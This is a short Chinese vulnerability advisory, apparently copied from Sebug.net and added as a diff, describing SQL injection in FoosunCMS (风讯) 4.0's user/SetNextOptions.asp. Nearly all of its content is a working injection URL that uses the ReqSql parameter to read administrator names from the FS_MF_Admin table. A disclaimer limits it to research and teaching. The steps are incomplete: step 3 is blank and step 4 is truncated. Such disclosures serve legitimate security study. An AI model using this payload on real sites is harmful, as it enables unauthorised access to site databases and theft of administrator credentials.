@@ -1,0 +1,6 @@
+风讯4.0 user/SetNextOptions.asp sql注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.构造注入2.user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_name,3,4,5,6,7,8++from+FS_MF_Admin“admin_name”管理用户名数据库表3. 4.user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa
